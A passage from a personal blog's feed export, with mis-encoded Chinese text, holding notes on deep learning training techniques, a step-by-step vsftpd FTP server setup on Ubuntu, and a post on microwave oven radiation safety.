å˜åŒ–çš„æŸä¸ªå±€éƒ¨ç©ºé—´åŒºåŸŸ</p><h3 id="ImageNet"><a href="#ImageNet" class="headerlink" title="ImageNet"></a>ImageNet</h3><p>ä¸€ä¸ªæ‹¥æœ‰è¶…è¿‡100ä¸‡å¼ å›¾åƒçš„æ•°æ®é›†</p><h3 id="åœ¨æ·±åº¦å­¦ä¹ ä¸­æ¯”è¾ƒçŸ¥åçš„ç½‘ç»œ"><a href="#åœ¨æ·±åº¦å­¦ä¹ ä¸­æ¯”è¾ƒçŸ¥åçš„ç½‘ç»œ" class="headerlink" title="åœ¨æ·±åº¦å­¦ä¹ ä¸­æ¯”è¾ƒçŸ¥åçš„ç½‘ç»œ"></a>åœ¨æ·±åº¦å­¦ä¹ ä¸­æ¯”è¾ƒçŸ¥åçš„ç½‘ç»œ</h3><ul><li>VGG</li><li>GoogLeNet</li><li>ResNet</li></ul><h3 id="æ·±åº¦å­¦ä¹ ä¸­é«˜é€ŸåŒ–çš„é—®é¢˜"><a href="#æ·±åº¦å­¦ä¹ ä¸­é«˜é€ŸåŒ–çš„é—®é¢˜" class="headerlink" title="æ·±åº¦å­¦ä¹ ä¸­é«˜é€ŸåŒ–çš„é—®é¢˜"></a>æ·±åº¦å­¦ä¹ ä¸­é«˜é€ŸåŒ–çš„é—®é¢˜</h3><p>åœ¨æ·±åº¦å­¦ä¹ ä¸­å¤§éƒ¨åˆ†æ—¶é—´éƒ½è€—è´¹åœ¨å·ç§¯å±‚ä¸Š</p><h3 id="åŸºäºGPUçš„é«˜é€ŸåŒ–"><a href="#åŸºäºGPUçš„é«˜é€ŸåŒ–" class="headerlink" title="åŸºäºGPUçš„é«˜é€ŸåŒ–"></a>åŸºäºGPUçš„é«˜é€ŸåŒ–</h3><p>æ·±åº¦å­¦ä¹ ä¸­éœ€è¦è¿›è¡Œå¤§é‡çš„ä¹˜ç§¯ç´¯åŠ è®¡ç®—ï¼Œè€Œè¿™æ­£æ˜¯GPUæ‰€æ“…é•¿çš„ï¼Œæ•…å¯ä½¿ç”¨GPUæ¥è¿›è¡Œæ·±åº¦å­¦ä¹ çš„è¿ç®—ä»¥æé«˜å­¦ä¹ é€Ÿåº¦</p><h3 id="åˆ†å¸ƒå¼å­¦ä¹ "><a href="#åˆ†å¸ƒå¼å­¦ä¹ " class="headerlink" title="åˆ†å¸ƒå¼å­¦ä¹ "></a>åˆ†å¸ƒå¼å­¦ä¹ </h3><p>ä¸ºäº†è¿›ä¸€æ­¥æé«˜æ·±åº¦å­¦ä¹ æ‰€éœ€çš„è®¡ç®—çš„é€Ÿåº¦ï¼Œå¯ä»¥è€ƒè™‘åœ¨å¤šä¸ªGPUæˆ–è€…å¤šå°æœºå™¨ä¸Šè¿›è¡Œåˆ†å¸ƒå¼è®¡ç®—</p>]]></content>
      
      
      
        <tags>
            
            <tag> çŸ¥è¯†è¾“å‡ºã€AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ftpæ–‡ä»¶æœåŠ¡å™¨æ­å»º</title>
      <link href="2021/12/16/ftp_server/"/>
      <url>2021/12/16/ftp_server/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¬¬ä¸€æ­¥ï¼šæ›´æ–°è½¯ä»¶åˆ—è¡¨"><a href="#ç¬¬ä¸€æ­¥ï¼šæ›´æ–°è½¯ä»¶åˆ—è¡¨" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šæ›´æ–°è½¯ä»¶åˆ—è¡¨"></a>ç¬¬ä¸€æ­¥ï¼šæ›´æ–°è½¯ä»¶åˆ—è¡¨</h2><a id="more"></a><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">zh@ubuntu:~$ sudo apt update</span><br><span class="line">[sudo] password for zh: </span><br><span class="line">Hit:1 http://cn.archive.ubuntu.com/ubuntu focal InRelease</span><br><span class="line">Get:2 http://cn.archive.ubuntu.com/ubuntu focal-updates InRelease [114 kB]</span><br><span class="line">Get:3 http://cn.archive.ubuntu.com/ubuntu focal-backports InRelease [108 kB]</span><br><span class="line">Get:4 http://cn.archive.ubuntu.com/ubuntu focal-security InRelease [114 kB]</span><br><span class="line">Get:5 http://cn.archive.ubuntu.com/ubuntu focal-updates/main amd64 Packages [1,397 kB]</span><br><span class="line">Get:6 http://cn.archive.ubuntu.com/ubuntu focal-updates/universe amd64 Packages [883 kB]                                       </span><br><span class="line">Fetched 2,615 kB in 10s (271 kB/s)                                                                                             </span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">49 packages can be upgraded. Run &#x27;apt list --upgradable&#x27; to see them.</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ç¬¬äºŒæ­¥ï¼šå®‰è£…vsftpd"><a href="#ç¬¬äºŒæ­¥ï¼šå®‰è£…vsftpd" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šå®‰è£…vsftpd"></a>ç¬¬äºŒæ­¥ï¼šå®‰è£…vsftpd</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">zh@ubuntu:~$ sudo apt install vsftpd</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">The following additional packages will be installed:</span><br><span class="line">  ssl-cert</span><br><span class="line">Suggested packages:</span><br><span class="line">  openssl-blacklist</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  ssl-cert vsftpd</span><br><span class="line">0 upgraded, 2 newly installed, 0 to remove and 49 not upgraded.</span><br><span class="line">Need to get 132 kB of archives.</span><br><span class="line">After this operation, 402 kB of additional disk space will be used.</span><br><span class="line">Do you want to continue? [Y/n] y</span><br><span class="line">Get:1 http://cn.archive.ubuntu.com/ubuntu focal/main amd64 ssl-cert all 1.0.39 [17.0 kB]</span><br><span class="line">Get:2 http://cn.archive.ubuntu.com/ubuntu focal/main amd64 vsftpd amd64 3.0.3-12 [115 kB]</span><br><span class="line">Fetched 132 kB in 3s (50.0 kB/s) </span><br><span class="line">Preconfiguring packages ...</span><br><span class="line">Selecting previously unselected package ssl-cert.</span><br><span class="line">(Reading database ... 71512 files and directories currently installed.)</span><br><span class="line">Preparing to unpack .../ssl-cert_1.0.39_all.deb ...</span><br><span class="line">Unpacking ssl-cert (1.0.39) </span><br><span class="line">Selecting previously unselected package vsftpd..............................................................................] </span><br><span class="line">Preparing to unpack .../vsftpd_3.0.3-12_amd64.deb ...</span><br><span class="line">Unpacking vsftpd (3.0.3-12) ...######################.......................................................................] </span><br><span class="line">Setting up ssl-cert (1.0.39) ...#################################...........................................................] </span><br><span class="line">Progress: [ 56%] [##########################################################................................................] </span><br><span class="line">Setting up vsftpd (3.0.3-12) ...########################################################....................................] </span><br><span class="line">Created symlink /etc/systemd/system/multi-user.target.wants/vsftpd.service â†’ /lib/systemd/system/vsftpd.service.............] </span><br><span class="line">Processing triggers for man-db (2.9.1-1) </span><br><span class="line">Processing triggers for systemd (245.4-4ubuntu3.11) ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ç¬¬ä¸‰æ­¥ï¼šæ·»åŠ ç”¨æˆ·"><a href="#ç¬¬ä¸‰æ­¥ï¼šæ·»åŠ ç”¨æˆ·" class="headerlink" title="ç¬¬ä¸‰æ­¥ï¼šæ·»åŠ ç”¨æˆ·"></a>ç¬¬ä¸‰æ­¥ï¼šæ·»åŠ ç”¨æˆ·</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">zh@ubuntu:~$ sudo nano /etc/vsftpd.conf</span><br><span class="line">zh@ubuntu:~$ sudo useradd -m ftpuser</span><br><span class="line">zh@ubuntu:~$ sudo passwd ftpuser</span><br><span class="line">New password: </span><br><span class="line">Retype new password: </span><br><span class="line">passwd: password updated successfully</span><br></pre></td></tr></table></figure><h2 id="ç¬¬å››æ­¥ï¼šæµ‹è¯•"><a href="#ç¬¬å››æ­¥ï¼šæµ‹è¯•" class="headerlink" title="ç¬¬å››æ­¥ï¼šæµ‹è¯•"></a>ç¬¬å››æ­¥ï¼šæµ‹è¯•</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/zh# echo &quot;TEST&quot; &gt; ../ftpuser/test.txt</span><br></pre></td></tr></table></figure><p><a href="https://www.helloimg.com/image/G9PfZv"><img src="https://www.helloimg.com/images/2021/12/16/G9PfZv.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/16/G9PfZv.png" srcset="data:image/png;base64,666" alt="G9PfZv.png"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep Learning from Scratch 3</title>
      <link href="2021/12/11/deep_learning_from_scratch_3/"/>
      <url>2021/12/11/deep_learning_from_scratch_3/</url>
      
        <content type="html"><![CDATA[<h2 id="è¯¯å·®åå‘ä¼ æ’­æ³•"><a href="#è¯¯å·®åå‘ä¼ æ’­æ³•" class="headerlink" title="è¯¯å·®åå‘ä¼ æ’­æ³•"></a>è¯¯å·®åå‘ä¼ æ’­æ³•</h2><a id="more"></a><h3 id="Affine-å±‚ï¼ˆä»¿å°„å˜æ¢ï¼‰"><a href="#Affine-å±‚ï¼ˆä»¿å°„å˜æ¢ï¼‰" class="headerlink" title="Affine å±‚ï¼ˆä»¿å°„å˜æ¢ï¼‰"></a>Affine å±‚ï¼ˆä»¿å°„å˜æ¢ï¼‰</h3><blockquote><p>ç¥ç»ç½‘ç»œçš„æ­£å‘ä¼ æ’­ä¸­è¿›è¡Œçš„çŸ©é˜µçš„ä¹˜ç§¯è¿ç®—åœ¨å‡ ä½•å­¦é¢†åŸŸè¢«ç§°ä¸ºâ€œä»¿å°„å˜æ¢â€</p></blockquote><p>â€‹    æ³¨ï¼šåœ¨affineå±‚çš„åå‘ä¼ æ’­è¿‡ç¨‹ä¸­è¦æ³¨æ„çŸ©é˜µå½¢çŠ¶</p><h3 id="æ¢¯åº¦ç¡®è®¤-gradient-check"><a href="#æ¢¯åº¦ç¡®è®¤-gradient-check" class="headerlink" title="æ¢¯åº¦ç¡®è®¤(gradient check)"></a>æ¢¯åº¦ç¡®è®¤(gradient check)</h3><blockquote><p>ç¡®è®¤æ•°å€¼å¾®åˆ†æ±‚å‡ºçš„æ¢¯åº¦ç»“æœå’Œè¯¯å·®åå‘ä¼ æ’­æ³•æ±‚å‡ºçš„ç»“æœæ˜¯å¦ä¸€è‡´çš„æ“ä½œ</p></blockquote><p>â€‹    ç”¨äºç¡®è®¤è¯¯å·®åå‘ä¼ æ’­æ³•çš„å®ç°æ˜¯å¦æ­£ç¡®</p><h2 id="ä¸å­¦ä¹ ç›¸å…³çš„æŠ€å·§"><a href="#ä¸å­¦ä¹ ç›¸å…³çš„æŠ€å·§" class="headerlink" title="ä¸å­¦ä¹ ç›¸å…³çš„æŠ€å·§"></a>ä¸å­¦ä¹ ç›¸å…³çš„æŠ€å·§</h2><h3 id="æœ€ä¼˜åŒ–"><a href="#æœ€ä¼˜åŒ–" class="headerlink" title="æœ€ä¼˜åŒ–"></a>æœ€ä¼˜åŒ–</h3><blockquote><p>è§£å†³â€œå¯»æ‰¾æœ€ä¼˜å‚æ•°çš„é—®é¢˜â€çš„è¿‡ç¨‹</p></blockquote><h3 id="SGD"><a href="#SGD" class="headerlink" title="SGD"></a>SGD</h3><blockquote><p>$$<br>W= W-Î·\frac{\partial L}{\partial W}<br>$$</p></blockquote><p><strong>ç¼ºç‚¹</strong></p><blockquote><p>å¦‚æœå‡½æ•°çš„å½¢çŠ¶éå‡å‘(anisotropic)ï¼Œæœç´¢çš„è·¯å¾„å°±ä¼šéå¸¸ä½æ•ˆ</p><p>æŠµæ¶ˆçš„æ ¹æœ¬åŸå› ï¼šæ¢¯åº¦çš„æ–¹å‘å¹¶æ²¡æœ‰æŒ‡å‘æœ€å°å€¼çš„æ–¹å‘</p></blockquote><h3 id="Momentum"><a href="#Momentum" class="headerlink" title="Momentum"></a>Momentum</h3><blockquote><p>$$<br>v=\alpha v - \eta \frac{\partial L}{\partial W}<br>$$</p><p>$$<br>W=W+v<br>$$</p></blockquote><h3 id="AdaGrad"><a href="#AdaGrad" class="headerlink" title="AdaGrad"></a>AdaGrad</h3><blockquote><p>$$<br>h=h+\frac{\partial L}{\partial W} .\frac{\partial L}{\partial W}<br>$$</p><p>$$<br>W=W-\eta \frac{1}{h^{\frac{1}{2}}}\frac{\partial L}{\partial W}<br>$$</p></blockquote><p>â€‹    AdaGradä¼šè®°å½•è¿‡å»æ‰€æœ‰æ¢¯åº¦çš„å¹³æ–¹å’Œã€‚å› æ­¤ï¼Œå­¦ä¹ è¶Šæ·±å…¥ï¼Œæ›´æ–°çš„å¹…åº¦å°±è¶Šå°ã€‚å®é™…ä¸Šï¼Œå¦‚æœæ— æ­¢å¢ƒçš„å­¦ä¹ ï¼Œæ›´æ–°é‡å°±ä¼šå˜æˆé›¶</p><h3 id="Adam"><a href="#Adam" class="headerlink" title="Adam"></a>Adam</h3><blockquote><p>èåˆäº†Momentumå’ŒAdaGradæ–¹æ³•ã€‚é€šè¿‡ç»„åˆå‰é¢ä¸¤ä¸ªæ–¹æ³•çš„ä¼˜ç‚¹ï¼Œæœ‰æœ›å®ç°å‚æ•°ç©ºé—´çš„é«˜æ•ˆæœç´¢</p><p>ç‰¹å¾ï¼šè¶…å‚æ•°çš„â€œåç½®æ ¡æ­£â€</p></blockquote><h3 id="æƒé‡çš„åˆå§‹å€¼"><a href="#æƒé‡çš„åˆå§‹å€¼" class="headerlink" title="æƒé‡çš„åˆå§‹å€¼"></a>æƒé‡çš„åˆå§‹å€¼</h3><p>â€‹    å°†æƒé‡è®¾ç½®ä¸º0çš„é—®é¢˜</p><p>â€‹    å¦‚æœå°†æƒé‡è®¾ç½®ä¸ºé›¶ï¼Œé‚£ä¹ˆä¸‹ä¸€å±‚çš„ç¥ç»å…ƒä¼šæ¯ä¼ é€’ç›¸åŒçš„å€¼ï¼Œä»è€Œè¾¾ä¸åˆ°å­¦ä¹ çš„æ•ˆæœï¼ˆä¹˜æ³•åå‘ä¼ æ’­çš„ä¾‹å­ï¼‰ï¼Œåˆ™åœ¨åå‘ä¼ æ’­æ—¶ç¬¬äºŒå±‚çš„æƒé‡è¿›è¡ŒåŒæ ·çš„æ›´æ–°ï¼Œè¿™ä½¿å¾—ç¥ç»ç½‘ç»œæ‹¥æœ‰è®¸å¤šä¸åŒçš„æƒé‡çš„æ„ä¹‰ä¸§å¤±äº†ã€‚å³é˜²æ­¢â€œæƒé‡å‡ä¸€åŒ–â€ï¼ˆç“¦è§£æƒé‡çš„å¯¹ç§°ç»“æ„ï¼‰</p><h3 id="æ¢¯åº¦æ¶ˆå¤±ï¼ˆæ¢¯åº¦çˆ†ç‚¸ï¼‰"><a href="#æ¢¯åº¦æ¶ˆå¤±ï¼ˆæ¢¯åº¦çˆ†ç‚¸ï¼‰" class="headerlink" title="æ¢¯åº¦æ¶ˆå¤±ï¼ˆæ¢¯åº¦çˆ†ç‚¸ï¼‰"></a>æ¢¯åº¦æ¶ˆå¤±ï¼ˆæ¢¯åº¦çˆ†ç‚¸ï¼‰</h3><p>åœ¨è¿ç”¨é“¾å¼æ³•åˆ™æ—¶ï¼Œç”±äºè¿ç®—æ—¶ä»¥è¿ä¹˜çš„å½¢å¼è¿›è¡Œï¼Œæ‰€ä»¥å½“å±‚æ•°å¾ˆæ·±æ—¶ï¼Œéšç€å±‚æ•°çš„å¢åŠ ï¼Œè®¡ç®—å‡ºçš„æ¢¯åº¦ä¼šæŒ‡æ•°çº§å˜åŒ–ï¼Œå¦‚æœæ˜¯å¾€å°äº†å˜ï¼Œå°±å‡ºç°äº†<strong>æ¢¯åº¦æ¶ˆå¤±</strong>ç°è±¡ï¼Œå¦‚æœæ˜¯å¾€å¤§äº†å˜ï¼Œå°±å‡ºç°äº†<strong>æ¢¯åº¦çˆ†ç‚¸</strong>ç°è±¡</p><h3 id="è¡¨ç°åŠ›å—é™"><a href="#è¡¨ç°åŠ›å—é™" class="headerlink" title="è¡¨ç°åŠ›å—é™"></a>è¡¨ç°åŠ›å—é™</h3><p>å½“ä¼ é€’ç»™ç¥ç»å…ƒçš„æ˜¯æœ‰æ‰€åå‘çš„æ•°æ®æ—¶ï¼Œæœ‰å¯èƒ½ä¼šå‡ºç°<strong>è¡¨ç°åŠ›å—é™</strong>çš„é—®é¢˜ï¼Œå³å¤šä¸ªç¥ç»å…ƒè¾“å‡ºç›¸åŒçš„ç»“æœï¼Œé‚£åŒæ ·å¯ä»¥ç”±ä¸€ä¸ªç¥ç»å…ƒå®Œæˆçš„äº‹æƒ…æ— ç–‘ä»¤è¿™äº›ç¥ç»å…ƒçš„å­˜åœ¨å˜å¾—æ— æ„ä¹‰</p><h3 id="Xavieråˆå§‹å€¼"><a href="#Xavieråˆå§‹å€¼" class="headerlink" title="Xavieråˆå§‹å€¼"></a>Xavieråˆå§‹å€¼</h3><blockquote><p>å¦‚æœå‰ä¸€å±‚çš„èŠ‚ç‚¹æ•°ä¸ºnï¼Œåˆ™åˆå§‹å€¼ä½¿ç”¨æ ‡å‡†å·®ä¸º1/(n^(1/2))çš„åˆ†å¸ƒ</p></blockquote><h3 id="ReLUçš„æƒé‡åˆå§‹å€¼"><a href="#ReLUçš„æƒé‡åˆå§‹å€¼" class="headerlink" title="ReLUçš„æƒé‡åˆå§‹å€¼"></a>ReLUçš„æƒé‡åˆå§‹å€¼</h3><blockquote><p>å½“æ¿€æ´»å‡½æ•°ä½¿ç”¨ReLUæ—¶ï¼Œä¸€èˆ¬æ¨èä½¿ç”¨ReLUä¸“ç”¨çš„åˆå§‹å€¼ï¼Œä¹Ÿç§°ä¸ºâ€œHeåˆå§‹å€¼â€</p><p>Heåˆå§‹å€¼ä½¿ç”¨æ ‡å‡†å·®ä¸º(2/n)^(1/2)çš„é«˜æ–¯åˆ†å¸ƒ</p></blockquote><h3 id="Batch-Nomalization-Batch-Norm"><a href="#Batch-Nomalization-Batch-Norm" class="headerlink" title="Batch Nomalization (Batch Norm)"></a>Batch Nomalization (Batch Norm)</h3><blockquote><p>ä»¥è¿›è¡Œå­¦ä¹ æ—¶çš„mini-batchä¸ºå•ä½ï¼ŒæŒ‰mini-batchè¿›è¡Œæ­£è§„åŒ–</p><p>è¿›è¡Œä½¿æ•°æ®åˆ†å¸ƒçš„å‡å€¼ä¸º0ï¼Œæ–¹å·®ä¸º1çš„æ­£è§„åŒ–<br>$$<br>\mu <em>B=\frac{1}{m}\Sigma^m</em>{i=1}x_i<br>$$</p><p>$$<br>\sigma ^2_B=\frac{1}{m}\Sigma^m_{i=1}(x_i-\mu_B)^2<br>$$</p><p>$$<br>x_i=\frac{x_i-\mu_B}{\sqrt{\sigma_B^2+\epsilon}}<br>$$</p></blockquote><p>ä¼˜ç‚¹ï¼š</p><ul><li>å¯ä»¥ä½¿å­¦ä¹ å¿«é€Ÿè¿›è¡Œï¼ˆå¯ä»¥å¢å¤§å­¦ä¹ ç‡ï¼‰</li><li>ä¸é‚£ä¹ˆä¾èµ–åˆå§‹å€¼ï¼ˆå¯¹äºåˆå§‹å€¼ä¸ç”¨é‚£ä¹ˆç¥ç»è´¨ï¼‰</li><li>æŠ‘åˆ¶è¿‡æ‹Ÿåˆï¼ˆé™ä½Dropouç­‰çš„å¿…è¦æ€§ï¼‰</li></ul><h3 id="è¿‡æ‹Ÿåˆ"><a href="#è¿‡æ‹Ÿåˆ" class="headerlink" title="è¿‡æ‹Ÿåˆ"></a>è¿‡æ‹Ÿåˆ</h3><blockquote><p>åªèƒ½æ‹Ÿåˆè®­ç»ƒæ•°æ®ï¼Œä½†ä¸èƒ½å¾ˆå¥½åœ°æ‹Ÿåˆä¸åŒ…å«åœ¨è®­ç»ƒæ•°æ®ä¸­çš„å…¶ä»–æ•°æ®çš„çŠ¶æ€</p></blockquote><p>åŸå› </p><ul><li> æ¨¡å‹æ‹¥æœ‰å¤§é‡å‚æ•°ï¼Œè¡¨ç°åŠ›å¼º</li><li>è®­ç»ƒæ•°æ®å°‘</li></ul><h3 id="æƒå€¼è¡°å‡"><a href="#æƒå€¼è¡°å‡" class="headerlink" title="æƒå€¼è¡°å‡"></a>æƒå€¼è¡°å‡</h3><blockquote><p>é€šè¿‡åœ¨å­¦ä¹ çš„è¿‡ç¨‹ä¸­å¯¹å¤§çš„æƒé‡è¿›è¡Œæƒ©ç½šï¼Œæ¥æŠ‘åˆ¶è¿‡æ‹Ÿåˆ</p></blockquote><p>ä¾‹ï¼šä¸ºæŸå¤±å‡½æ•°åŠ ä¸Šæƒé‡çš„å¹³æ–¹èŒƒæ•°ï¼ˆ1/2Î»W^2ï¼‰</p><h3 id="Dropout"><a href="#Dropout" class="headerlink" title="Dropout"></a>Dropout</h3><blockquote><p>Dropoutæ˜¯ä¸€ç§åœ¨å­¦ä¹ çš„è¿‡ç¨‹ä¸­éšæœºåˆ é™¤ç¥ç»å…ƒçš„æ–¹æ³•ã€‚è®­ç»ƒæ—¶ï¼Œéšæœºé€‰å‡ºéšè—å±‚çš„ç¥ç»å…ƒï¼Œç„¶åå°†å…¶åˆ é™¤ã€‚è¢«åˆ é™¤çš„ç¥ç»å…ƒä¸å†è¿›è¡Œä¿¡å·çš„ä¼ é€’</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> çŸ¥è¯†è¾“å‡ºã€AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¾®æ³¢ç‚‰ç©¶ç«Ÿæœ‰æ²¡æœ‰è¾å°„</title>
      <link href="2021/11/30/microwave_oven/"/>
      <url>2021/11/30/microwave_oven/</url>
      
        <content type="html"><![CDATA[<blockquote><p>éœ‡æƒŠï¼è¿™ä¸ªå¸¸è§çš„å®¶ç”¨ç”µå™¨ç«Ÿæœ‰è¿™ä¹ˆå¤§çš„è¾å°„</p></blockquote><a id="more"></a><h2 id="ç›´å¥”ä¸»é¢˜ï¼Œå¾®æ³¢ç‚‰å¯¹äººä½“ç©¶ç«Ÿä¼šä¸ä¼šäº§ç”Ÿå±å®³"><a href="#ç›´å¥”ä¸»é¢˜ï¼Œå¾®æ³¢ç‚‰å¯¹äººä½“ç©¶ç«Ÿä¼šä¸ä¼šäº§ç”Ÿå±å®³" class="headerlink" title="ç›´å¥”ä¸»é¢˜ï¼Œå¾®æ³¢ç‚‰å¯¹äººä½“ç©¶ç«Ÿä¼šä¸ä¼šäº§ç”Ÿå±å®³"></a>ç›´å¥”ä¸»é¢˜ï¼Œå¾®æ³¢ç‚‰å¯¹äººä½“ç©¶ç«Ÿä¼šä¸ä¼šäº§ç”Ÿå±å®³</h2><p>è¦çŸ¥é“å¾®æ³¢ç‚‰æ˜¯å¦ä¼šå¯¹äººä½“äº§ç”Ÿå±å®³ï¼Œå°±å¾—å…ˆçŸ¥é“ä»€ä¹ˆç¨‹åº¦çš„å¾®æ³¢ä¼šå¯¹äººä½“äº§ç”Ÿå±å®³</p><blockquote><img src="https://www.helloimg.com/images/2021/11/30/Ga0JEt.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga0JEt.png" srcset="data:image/png;base64,666" alt="Ga0JEt.png" style="zoom:50%;" /><img src="https://www.helloimg.com/images/2021/11/30/Ga0xjQ.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga0xjQ.png" srcset="data:image/png;base64,666" alt="Ga0xjQ.png" style="zoom:50%;" /></blockquote><p>å¯ä»¥çœ‹å‡ºï¼Œåªè¦50mmä»¥å¤–æ³„éœ²çš„å¾®æ³¢å°äºç­‰äº50W/m^2ï¼Œå°±ä¸ä¼šå¯¹äººä½“é€ æˆå½±å“ï¼Œè€Œå¸‚é¢ä¸Šçš„ç»å¤§å¤šæ•°å¾®æ³¢ç‚‰ä¹Ÿéƒ½æ»¡è¶³è¿™ä¸€æ ‡å‡†ï¼Œå³ä½¿åœ¨ä½¿ç”¨äº†ä¸€æ®µæ—¶é—´åï¼Œè™½ç„¶é—¨æŠŠæ‰‹åŠç‚‰é—¨å¯†å°å¤„å¾®æ³¢æ³„æ¼é‡ç•¥æœ‰ä¸Šå‡ï¼Œä½†ä¹Ÿéƒ½åœ¨æ ‡å‡†ä»¥å†…</p><p>é¡ºä¾¿è¯´ä¸€å£°ï¼Œå¾®æ³¢ç‚‰çš„äº§ç”Ÿçš„è¾å°„å±äºéç”µç¦»è¾å°„ï¼Œå¹¶ä¸èƒ½ç ´ååˆ†å­ç»“æ„å’Œäº§ç”Ÿç”µç¦»ä½œç”¨ï¼›é¢‘ç‡åœ¨2.45GHzå·¦å³ï¼Œä¹Ÿå°±WIFIçš„é¢‘ç‡ï¼Œè€Œä¸”å¾®æ³¢ç‚‰æ˜¯åœ¨é‡‘å±å®¹å™¨ä¸­å·¥ä½œçš„ï¼Œè¿™äº›é‡‘å±å®¹å™¨èƒ½å¤Ÿå¾ˆå¥½åœ°é™åˆ¶å¾®æ³¢</p><p><strong>æ‰€ä»¥ï¼Œå¾®æ³¢ç‚‰ä¸ä¼šå¯¹äººä½“é€ æˆä¼¤å®³</strong></p><h2 id="é—®é¢˜è§£ç­”"><a href="#é—®é¢˜è§£ç­”" class="headerlink" title="é—®é¢˜è§£ç­”"></a>é—®é¢˜è§£ç­”</h2><h4 id="å¾®æ³¢ç‚‰æ³„æ¼çš„è¾å°„ä¼šè‡´ç•¸ï¼Ÿ"><a href="#å¾®æ³¢ç‚‰æ³„æ¼çš„è¾å°„ä¼šè‡´ç•¸ï¼Ÿ" class="headerlink" title="å¾®æ³¢ç‚‰æ³„æ¼çš„è¾å°„ä¼šè‡´ç•¸ï¼Ÿ"></a>å¾®æ³¢ç‚‰æ³„æ¼çš„è¾å°„ä¼šè‡´ç•¸ï¼Ÿ</h4><details ><summary> ç‚¹å‡»æŸ¥çœ‹ç­”æ¡ˆ </summary>              <div class='content'>              <p>åŒæ ·æ˜¯2.45GHzå·¦å³çš„é¢‘ç‡ï¼Œæ—¢ç„¶WIFIæ²¡æœ‰è‡´ç•¸ä½œç”¨ï¼Œæƒ³å¿…å¾®æ³¢ç‚‰ä¹Ÿä¸å…·å¤‡è¿™æ ·çš„èƒ½åŠ›</p><p><img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAsJCQcJCQcJCQkJCwkJCQkJCQsJCwsMCwsLDA0QDBEODQ4MEhkSJRodJR0ZHxwpKRYlNzU2GioyPi0pMBk7IRP/2wBDAQcICAsJCxULCxUsHRkdLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCz/wAARCAEtASwDASIAAhEBAxEB/8QAHAAAAQQDAQAAAAAAAAAAAAAAAAECBgcDBAUI/8QAUxAAAQMDAwEEBgQJBgoJBQAAAQIDBAAFEQYSITEHE0FRFCIyYXGBFiNCkRVSVXKVobGz0jM0NnR10TVDYnOCk6KywfAXJCc3U4O00+ElRVfE8f/EABYBAQEBAAAAAAAAAAAAAAAAAAABA//EABsRAQEAAgMBAAAAAAAAAAAAAAABAhIDEzER/9oADAMBAAIRAxEAPwC2/nR86KKA+dHzoooD50fOio/edYaXseUzZzan+cR431z2RxgpRwPmRQSD50fOqondr7I9W3WdxWUqyua6E4V0GEN54/0q4X/Sxq8HJYtmM/8AgudPL+UoL0+dHzqtbX2s2Z/Y3dIT0RZwC6wQ8znpynhQ/XVhRJkKew3JhvtPsuAKStpQUMHnBxyD7qDY+dHzoooD50fOiigPnR86KKA+dFYXpMSP/LyGGfLvnUI/3iK1lXqwIOFXa2A+RmRwf96g2HZkFhxLT0qO06oBSUOvNoWoE4BCVEGswIIBByCMgjoR7qg95esb92jvsyrZKTPjIiLDbsd9SZEdS1t7gCThaVKA96QOqqYw+uyK9LinuojSgq4RN2I62CoJW622TtS4jO4YxnGCCSCjScduO0azjuWP2J5RUHl3J29qccS+tNpCiiKww4psy0jjv5KmyF7VdUIyBjBUCVYbxQYDH4Vs7MJhLD6H0zpK42WlNwmQrId2EZDiilIBzkbj0TmnXddqdV12qe0fOiis2Q+dHzoooD50fOiigPnR86KKA+dHzoooD50fOiigPnR86KKA+dHzoooCiiigKQlKUqUogJSCVFRAAA5JJNLVZ9p2q5FuaascB0IkS2VOTXEH122VcJaHlu5J93x5Dlax7S31OP23Tq+7aQVNvTxje5jghjyHv6/CqqWta1qWpRUtRKlK